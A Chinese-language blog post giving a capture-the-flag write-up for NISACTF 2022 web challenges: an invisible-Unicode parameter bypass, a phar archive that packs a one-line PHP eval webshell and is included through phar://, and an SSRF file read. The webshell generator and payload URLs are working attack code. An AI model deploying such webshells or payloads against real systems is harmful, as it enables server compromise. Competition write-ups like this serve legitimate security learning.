---
title: NISACTF2022
date: 2022-3-29 23:10:33
tags: phar
categories: 比赛题目复现
top_img: https://images.wallpaperscraft.com/image/single/ruins_rock_art_269282_1280x720.jpg
cover: https://images2.alphacoders.com/103/thumbbig-103322.webp
---

# NISACTF 2022

## checkin

给了源码

```php
<?php
error_reporting(0);
include "flag.php";
// ‮⁦NISACTF⁩⁦Welcome to
if ("jitanglailo" == $_GET[ahahahaha] &‮⁦+!!⁩⁦& "‮⁦ Flag!⁩⁦N1SACTF" == $_GET[‮⁦Ugeiwo⁩⁦cuishiyuan]) { //tnnd! weishenme b
    echo $FLAG;
}
show_source(__FILE__);
?> 
```

其实就是一个不可见字符

拖到编辑器里，复制对应的get参数的16进制编码构造即可

### **payload**

```
http://120.27.195.236:28990/?ahahahaha=jitanglailo&%E2%80%AE%E2%81%A6%55%67%65%69%77%6F%E2%81%A9%E2%81%A6%63%75%69%73%68%69%79%75%61%6E=%E2%80%AE%E2%81%A6%20%46%6C%61%67%21%E2%81%A9%E2%81%A6%4E%31%53%41%43%54%46
```

## bingdundun

存在文件包含，会自动加上`.php`

![](https://i0.hdslb.com/bfs/album/f546544430cbe51f88ce770bccc18c7f067374fd.png)

在根据提示只能上传图片和压缩包，所以判断应该是上传phar文件，在包含phar文件执行恶意代码

phar文件内容

```php
<?php
    $phar = new Phar("exp.phar"); 
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); 
    $phar->addFromString("shell.php", '<?php eval($_POST[shell]);?>'); 
    $phar->stopBuffering();
?>
```

生成phar文件后再改后缀为.zip

上传后获得地址

![](https://i0.hdslb.com/bfs/album/6065278483939f27f39d87173713c7d040a95727.png)

利用phar协议进行包含

```
?bingdundun=phar:///var/www/html/cfd542b4d5b47b4d02051af4a7d87491.zip/shell
```

最后蚁剑连接，根目录下获得flag

## easyssrf

url参数处存在ssrf漏洞，可使用file协议，在读取flag时获得提示

![](https://i0.hdslb.com/bfs/album/b5d9262097aba6d0226b3019e9ed875b921f64c9.png)

![](https://i0.hdslb.com/bfs/album/3d977b9d8db5f15762eee5f6eb23ca2b8258be00.png)

![](https://i0.hdslb.com/bfs/album/a375c08b1454b99bf03e70586f45b845e2e11537.png)

什么都没过滤

### payload

```
?file=/flag
```

![](https://i0.hdslb.com/bfs/album/e0d7fda5cf37d9d0caf092999e182bf0bc0d1e90.png)

## midlevel

buu原题 **[CISCN2019_华东南赛区]Web11**

## in secret

buu原题 **[CISCN2019_华东南赛区]Double_Secret**

## popchain

buu原题**Ezpop**
